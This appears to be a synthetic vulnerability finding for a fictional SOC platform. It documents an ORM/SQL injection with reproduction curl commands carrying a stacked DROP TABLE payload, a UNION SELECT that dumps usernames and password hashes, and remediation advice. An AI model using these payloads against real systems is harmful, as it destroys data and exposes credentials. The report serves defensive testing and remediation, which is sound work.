## System

- System: ThreatLens SOC Platform v4.8.0
- Domain: CYBERSECURITY / SIEM
- Example ID: INJ-0133
- Risk ID: RISK-INJ-133
- Vulnerability: ORM Injection (ORMi)

## Findings

### 1. ORM Injection on `/api/v3/records?query=` (HAR Primary)

**HAR evidence**: `GET /api/v3/records?query=1;%20DROP%20TABLE%20records--` → HTTP 200 with all user records: `username: "admin"`, `password_hash: "$2b$12$secret"`, `role: "ADMIN"`, `username: "user2"`.

**ORM Injection (ORMi)**: the endpoint uses Hibernate/Sequelize raw query (Section 2.0: "raw queries — primary data store") with direct string interpolation: `SELECT * FROM records WHERE query = '${req.query.query}'` (Section 3.0). The payload `1; DROP TABLE records--` terminates the WHERE clause and appends a DDL `DROP TABLE` statement. With `db_owner` privileges (Section 6.0), the ORM executes the stacked DDL statement. The immediate return of all user records in the HAR response confirms the query was already compromised on the read path. The `DROP TABLE records` would execute as a separate statement after the response.

**SIEM / Cybersecurity impact**: `records` represents the SOC's security event logs — threat intelligence records, incident data, IOC lists. `DROP TABLE records` destroys the SOC's entire event database — wiping all forensic evidence and disabling threat detection. Admin credential exposure (`role: "ADMIN"`) enables full SOC platform takeover.

**Root cause**: raw ORM string concatenation, `db_owner` privileges, no WAF, no input validation on legacy endpoint (RISK-INJ-133 — missed in parameterized query migration).

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.threatlens-soc-.example.com/api/v3/records?query=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected: Returns matching records only.

**Step 2 — ORMi DDL + data exfiltration (primary HAR attack):**

```bash
curl -s "https://api.threatlens-soc-.example.com/api/v3/records?query=1;%20DROP%20TABLE%20records--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected secure: 400 Bad Request / sanitized error.  
Expected vulnerable: HTTP 200 — all security event records returned (including admin password hashes), and `DROP TABLE records` statement queued for execution.

**Step 3 — UNION data exfiltration (db_owner):**

```bash
curl -s "https://api.threatlens-soc-.example.com/api/v3/records?query=' UNION SELECT username,password_hash,role FROM users--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable: Credential dump from `users` table — enables admin account takeover of the SOC platform.

**Step 4 — Verbose error confirmation:**

```bash
curl -s "https://api.threatlens-soc-.example.com/api/v3/records?query='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected (if misconfigured): SQL syntax error leaking table name, column names, or DB version.

## Evidence

- **HAR**: `GET /api/v3/records?query=1;%20DROP%20TABLE%20records--` → HTTP 200 → all user records with `password_hash` and `role: "ADMIN"`.
- **Section 3.0 (RISK-INJ-133)**: raw ORM string concatenation — `SELECT * FROM records WHERE query = '${req.query.query}'`.
- **Section 4.0**: payload `1; DROP TABLE records--` — DDL injection.
- **Section 6.0**: `db_owner` privileges, no WAF, verbose errors.

## Remediation

- **Parameterized queries**: replace `${req.query.query}` with `?` or named parameters in ORM.
- **Restrict DB account**: application account must use least-privilege (SELECT only on required tables, no DDL).
- **Disable verbose error messages in production**.
- **Input validation middleware**: reject inputs containing SQL metacharacters (`;`, `--`, `DROP`, `/*`).
- **ORM migration**: complete migration of `/api/v3/records` to parameterized ORM queries (RISK-INJ-133 remediation).
